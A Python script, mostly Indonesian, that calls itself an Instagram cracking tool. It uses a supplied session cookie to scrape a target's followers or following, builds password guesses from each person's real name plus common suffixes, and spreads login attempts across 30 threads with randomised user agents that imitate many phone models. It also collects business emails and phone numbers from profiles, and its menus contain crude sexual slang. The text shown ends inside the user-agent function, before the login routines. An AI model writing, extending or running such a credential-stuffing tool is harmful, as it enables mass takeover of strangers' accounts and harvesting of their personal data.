#!/usr/bin/python3
import urllib.parse
from urllib.parse import quote
import re, os, sys, json, random, urllib, urllib.request, hmac, hashlib, time, string, uuid, requests, base64,datetime,subprocess
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as bsp
from rich.progress import Progress,TextColumn,SpinnerColumn
from rich import print as prints
from rich.panel import Panel as panel
from string import *
xx = 0
rr = random.randint;rc = random.choice

Uid, Uuid = [], []
Ok, Cp, Loop = 0, 0, 0

###----------[ PEWARNA ]----------###
mer = '\033[1;31m'
ung = '\033[1;33m'
hijo = '\033[1;32m' 
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # ungING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # ungING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m'  # BIRU +
# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
A = "\x1b[38;5;248m"
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
# ------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
			
#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
ung = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
BLUE = "\033[0;34m"
END  = "\033[0m"
RED  = "\033[0;31m"
CYAN = "\033[0;36m"

GREEN       = "\033[0;32m"
LIGHT_CYAN  = "\033[1;36m"
LIGHT_WHITE = "\033[1;37m"
P = "\033[97m"
I = "\033[30m"
A = "\033[90m"
K = "\033[33m"
M, K2 = K, K
H='\033[96;1m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
J='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
getuserid = 'https://i.instagram.com/api/v1/users/web_profile_info/?username={nama!s}'
HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': '1217981644879628','x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E','sec-fetch-site': 'same-origin','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
ua = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
userinfo  = 'https://i.instagram.com/api/v1/users/{id!s}/info/'

def Clear():
	try:
		os.system('clear')
	except:pass

def find_res(kya= []):
	try:
		if os.path.isfile('Data/OK--50.txt') is True:
			for a in open('Data/OK-50.txt','r').read().splitlines():
				xyz = re.findall('ds_user_id=(.*)',str(a))
				if len(xyz) == 0:continue
				if xyz not in meki:meki.append('ds_user_id=%s'%(xyz[0]))
		if os.path.isfile('Data/OK-100.txt') is True:
			for a in open('Data/OK-100.txt','r').read().splitlines():
				xyz = re.findall('ds_user_id=(.*)',str(a))
				if len(xyz) == 0:continue
				if xyz not in meki:meki.append('ds_user_id=%s'%(xyz[0]))
	except:pass
	if len(kya) == 0:
		for kyta in kya:
			try:
				print(f'\n{P}Login: {H}{kyta}')
				uid = re.search('ds_user_id=(\d+)', str(kyta)).group(1)
				req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies={'cookie':kyta}).json()['user']['full_name']
				open('Data/IG-login.txt','w').write(f'{kyta}')
				print(f'\n{P}Login sebagai : {req}')
				time.sleep(2)
				return(memek)
			except Exception as e:
				print(f'\n{P}Expired: {K}{kyta}')
				
def Aset_Ig():
	Clear()
	if os.path.isfile('Data/IG-login.txt') is True:
		coki = {'cookie':open('Data/IG-login.txt','r').read()}
	else:
		print(f"{P}[/] Silahkan Masukan Cookies Akun Instagram Pastikan Menggunakan Akun Tumbal!")
		raraky = {'cookie':input("\ncookie: ")}
		if raraky['cookie'] == 'res':
			coki = {'cookie':find_res()}
		else:
			coki = raraky
	try:
		#cek = requests.get('https://www.instagram.com/api/v1/tags/web_info/?tag_name=khmd', headers=ua,  cookies=coki).json()
		uid = re.search('ds_user_id=(\d+)', str(coki['cookie'])).group(1)
		req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies=coki).json()['user']
		open('Data/IG-login.txt','w').write(f'{coki["cookie"]}')
	except:
		os.system('rm -rf Data/IG-login.txt')
		print(f"{M}cookies Invalid Gunakan Cookies yang Lain!");time.sleep(3);Aset_Ig()
	return coki, req['full_name'], req['follower_count']

#----------[ BANNER ]----------#
def banner():
      if "win" in sys.platform:os.system("clear")
      else:os.system("clear")
      prints(panel('''\t[bold blue]      
  

                 ███████╗██████╗ ████████╗███████╗██╗   ██╗
                 ██╔════╝██╔══██╗╚══██╔══╝╚══███╔╝╚██╗ ██╔╝
                 ███████╗██████╔╝   ██║     ███╔╝  ╚████╔╝ 
                 ╚════██║██╔═══╝    ██║    ███╔╝    ╚██╔╝  
                 ███████║██║        ██║   ███████╗   ██║   
                 ╚══════╝╚═╝        ╚═╝   ╚══════╝   ╚═╝   
                                          
''',width=80,style=f"bold blue"))

def Menu():
	Clear()
	aset, nama, fol = Aset_Ig()
	banner()
	print(f"{biru}╭────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f"{biru}╰─{b}➤{puti} Script Cracking Instagram V 1.0")
	print(f"{biru}╰─{b}➤{puti} NAMA : @{nama[:8]}")
	print(f"{biru}╰─{b}➤{puti} PENGIKUT : {fol}")
	print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f"{biru}╭────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f"{biru}╭────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f"{biru}╰─{b}➤ {puti}01. Crack Pengikut\n{biru}╰─{b}➤{puti} 02. Crack Mengikuti\n{biru}╰─{b}➤ {puti}03. Crack Komentar\n{biru}╰─{b}➤{puti} 00. Keluar")
	print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f"{biru}╭────────────────────────────────────────────────────────────────────────────{b}➤")
	x = input(f'{biru}╰─{b}➤{P} Input menu : ')
	if x in ['01','1']:dumps(aset, True)
	elif x in ['02','2']:dumps(aset, False)
	elif x in ['00','0']:os.system("rm Data/IG-login.txt");print("berhasil menghapus cookies");exit()

def dumps(cintil, typess, xyz = []):
	if 'csrftoken' not in str(cintil):
		try:
			memek = requests.get('https://www.instagram.com/data/shared_data/', cookies = cintil).json()
			token = memek['config']['csrf_token']
			cintil['cookie'] +=';csrftoken=%s;'%(token)
		except Exception as e:
			os.system('rm -rf Data/IG-login.txt')
			exit(f'\n{P}[{K}!{P}] Csrftoken tidak tersedia, dump tidak akan berjalan: {e}')
	print(f"{biru}╭────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f"{biru}╰─{b}➤ {puti} MASUKAN USERNAME TARGET")
	print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f"{biru}╭────────────────────────────────────────────────────────────────────────────{b}➤")
	users = input(f"{biru}╰─{b}➤{P} Username : ").split(',')
	try:
		for y in users:
			req = requests.get(f'https://www.instagram.com/{y}/', cookies = cintil).text
			uid = re.search('"user_id":"(\d+)"', str(req)).group(1)
			if uid not in xyz:xyz.append(uid)
	except:pass
	try:
		mode = 'followers' if typess is True else 'following'
		for kintil in xyz:
			if typess is True:
				Graphql(True, kintil, cintil['cookie'], '')
			else:
				Graphql(False, kintil, cintil['cookie'], '')
	except:pass
	print("");MetodeType()
		
def Graphql(typess, userid, cokie,after):
	global xx
	api = "https://www.instagram.com/graphql/query/"
	csr = 'variables={"id":"%s","first":24,"after":"%s"}'%(userid,after)
	mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(csr) if typess is False else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(csr)
	try:
		ptk = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cokie}
		req = requests.get(api, params=mek, headers=ptk).json()
		if 'require_login' in req:
			if len(Uuid) > 0:
				pass
			else:
				exit(f'\n{P}[{K2}!{P}] Invalid Cookie')
		khm = 'edge_followed_by' if typess is True else 'edge_follow'
		for xyz in req['data']['user'][khm]['edges']:
			username = xyz['node']['username']
			xy = xyz['node']['username'] + '|' + xyz['node']['full_name']
			if xy not in Uuid:
				xx += 1
				Uuid.append(xy)
				print('\r{}╰─{}➤ {}Berhasil mengumpulkan {} {}{}{}                            '.format(biru, b, puti, b, b, len(Uuid), P), end='')
				time.sleep(0.0009)
		end = req['data']['user'][khm]['page_info']['has_next_page']
		if end is True:
			after = req['data']['user'][khm]['page_info']['end_cursor']
			Graphql(typess, userid, cokie, after)
		else:pass
	except:pass

def MetodeType():
	global SistemLog
	print(f"{biru}╭────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f'{biru}|─{b}➤{puti} 01. SPTZY PEMBURU TOBRUT {b} DATA ONLY\n{biru}|─{b}➤ {puti}02. SPTZY PEMBURU GAME SUPPORT {b}DATA/WIFI\n{biru}|─{b}➤ {puti}03. SPTZY PEMBURU FREE SUPPORT {b}DATA/WIFI\n{biru}|─{b}➤ {puti}04. SPTZY PEMBURU NGENTOD {b}DATA/WIFI')
	print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f"{biru}╭────────────────────────────────────────────────────────────────────────────{b}➤")
	method = input(f'{biru}|─{b}➤{puti} Pilih : ')
	if method in ['01','1']: SistemLog = "api.instagram.com"
	elif method in ['02','2']: SistemLog = "i.instagram.com"
	elif method in ['03','3']: SistemLog = "www.instagram.com"
	elif method in ['04','4']: SistemLog = "b.i.instagram.com"
	else:SistemLog = "api.instagram.com"
	SetCrack()

def SetCrack():
	print(f"{biru}╭────────────────────────────────────────────────────────────────────────────{b}➤")
	print(f'{biru}|─{b}➤{puti} JANGAN LUPA MAINKAN {b}MODPES{puti}')
	print(f"{biru}╰────────────────────────────────────────────────────────────────────────────{b}➤")
	with ThreadPoolExecutor (max_workers=30) as ASF:
		for i in Uuid:
			try:
				username, name = i.split('|')
				kontol = Password(name)
				if SistemLog == "api.instagram.com":
					ASF.submit(Crack_api, username, kontol)
				elif SistemLog == "i.instagram.com":
					ASF.submit(Crack_i, username, kontol)
				elif SistemLog == "www.instagram.com":
					ASF.submit(Crack_w, username, kontol)
				elif SistemLog == "b.i.instagram.com":
					ASF.submit(Crack_N, username, kontol)
			except:pass
	exit(f' \n\n{biru}╰─{b}▶{puti} Crack Telah Selesai')
	
def Password(name):
        xxzx, ccvc = [], []
        for nama in name.split(' '):
            nama = nama.lower()
            if len(nama) <3: continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5:xxzx.append(nama+'12');xxzx.append(nama+'321');xxzx.append(nama+'01');xxzx.append(nama+'02');xxzx.append(nama+'03');xxzx.append(nama+'04');xxzx.append(nama+'05');xxzx.append(nama+'99');xxzx.append(nama+'0823');xxzx.append(nama+'0852');xxzx.append(nama+'10');xxzx.append(nama+'ganteng');xxzx.append(nama+'cantik');xxzx.append(nama+'comel');xxzx.append(nama+'imut');xxzx.append(nama+'sukses');xxzx.append(nama+'2000');xxzx.append(nama+'2001');xxzx.append(nama+'2002');xxzx.append(nama+'2003');xxzx.append(nama+'2004');xxzx.append(nama+'123');xxzx.append(nama+'1234');xxzx.append(nama+'12345');xxzx.append(nama+'123456');xxzx.append(nama+'1234567');xxzx.append(nama+'12345678');
            else:xxzx.append(nama+'12');xxzx.append(nama+'321');xxzx.append(nama+'01');xxzx.append(nama+'02');xxzx.append(nama+'03');xxzx.append(nama+'04');xxzx.append(nama+'05');xxzx.append(nama+'99');xxzx.append(nama+'0823');xxzx.append(nama+'0852');xxzx.append(nama+'ganteng');xxzx.append(nama+'comel');xxzx.append(nama+'imut');xxzx.append(nama+'sukses');xxzx.append(nama+'cantik');xxzx.append(nama+'2000');xxzx.append(nama+'2001');xxzx.append(nama+'2002');xxzx.append(nama+'2003');xxzx.append(nama+'2004');xxzx.append(nama+'123');xxzx.append(nama+'1234');xxzx.append(nama+'12345');xxzx.append(nama+'123456');xxzx.append(nama+'1234567');xxzx.append(nama+'12345678')
        return(xxzx)

def convert_cookie(item):
    try:
        sesid = 'sessionid=' + re.findall('sessionid=(\d+)', str(item))[0]
        ds_id = 'ds_user_id=' + re.findall('ds_user_id=(\d+)', str(item))[0]
        csrft = 'csrftoken=' + re.findall('csrftoken=(.*?);', str(item))[0]
        donez = '%s;%s;%s;ig_nrcb=1;dpr=2'%(ds_id, sesid, csrft)
    except Exception as e:
        donez = 'cookies tidak di temukan, error saat convert'
    return donez

ses = requests.Session()
def data_target(name):
	for y in name.split(','):
		try:
			HEADERS.update({'user-agent'  : 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)','x-ig-app-id' :'1217981644879628'})
			profil_info_target = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers = HEADERS).json()['data']['user']
			post      = profil_info_target["edge_owner_to_timeline_media"]["count"]
			peng  = profil_info_target["edge_followed_by"]["count"]
			meng = profil_info_target["edge_follow"]["count"]
			mail = profil_info_target["business_email"]
			phone = profil_info_target["business_phone_number"]
			fullname = profil_info_target["full_name"]
			fbid = profil_info_target["fbid"]
		except Exception as e:
			post, peng, meng, mail, fullname, fbid, phone = None, None, None, None, None,  None, None
	return post, peng, meng, mail, fullname, fbid, phone

def UserAgent():
	andro=rc(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
	dpis=rc(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
	pxl = rc(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733'])
	basa = rc(['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
	kode = rc(['145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','239490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','242290370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','245870347','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','253447814','253447807','253447811','253447817','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431','262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397343','267925708','267397327','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182266','271182276','269790798','271182279','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186'])  
	igv = (f'{random.randint(299,399)}.{random.randint(1,10)}.0.{random.randint(20,35)}.{random.randint(90,120)}')
	igve=igv.split(",")
	kntlgoreng = rc(["kenzo","markw","mido","ginkgo","hydrogen","tissot_sprout"])
	redmis = rc(["Redmi Note 4","Redmi Note 8","Redmi Note 9 Pro","MI MAX","Mi A1","Redmi Note 9S","23127PN0CC","Redmi Note 5","M2007J17C","M2101K7BNY","2201116SC","M2011K2C","Redmi Note 11R","iPhone14,3','iPhone14,4','iPhone15,5','iPhone15,6','iPad9,5','iPad9,6','iPad9,7','iPad9,8','iPad10,5','iPad10,6','iPad11,3','iPad11,4','iPad12,3','iPad12,4','iPad13,3','iPad13,6','iPad14,5','iPad14,6','iPad15,1','iPad15,2','iPad16,1','iPad16,2','iPhone4,2','iPhone4,3','iPhone4,4','iPhone4,5','iPhone4,6','iPhone5,2','iPhone5,3','iPhone5,4','iPhone6,5','iPhone6,6','iPhone6,7','iPhone6,8','iPhone7,4','iPhone8,8','iPhone10,3','iPhone10,4','iPhone11,3','iPhone11,4','iPhone12,4','iPhone12,7','iPhone13,6','iPhone13,7','iPhone13,9','iPhone14,9','iPhone14,10','iPhone14,11','iPhone15,7','iPad10,7','iPad10,8','iPad11,5','iPad12,5','iPad13,8','iPad13,9','iPad14,8','iPad15,5','iPad16,3','iPad16,4','iPhone1,1','iPhone1,2','iPhone2,1','iPhone3,1','iPhone3,2','iPhone3,3','iPhone4,1','iPhone4,2','iPhone5,1','iPhone5,2','iPhone5,3','iPhone5,4','iPhone6,1','iPhone6,2','iPhone6,3','iPhone6,4','iPhone7,1','iPhone7,2','iPhone8,1','iPhone8,2','iPhone9,1','iPhone9,2","SM-F926B','SM-F926U','SM-F926N','SM-F926A','SM-F926F','SM-N970B','SM-N970U','SM-N970N','SM-N970A','SM-N970F','SM-N975B','SM-N975U','SM-N975N','SM-N975A','SM-N975F','SM-N980B','SM-N980U','SM-N980N','SM-N980A"])
	mereek = rc(["samsung","realme","OnePlus","LAVA","TCL","motorola","Xiaomi/POCO","T790Y","Amazon","Google/google","Xiaomi","OPPO"])
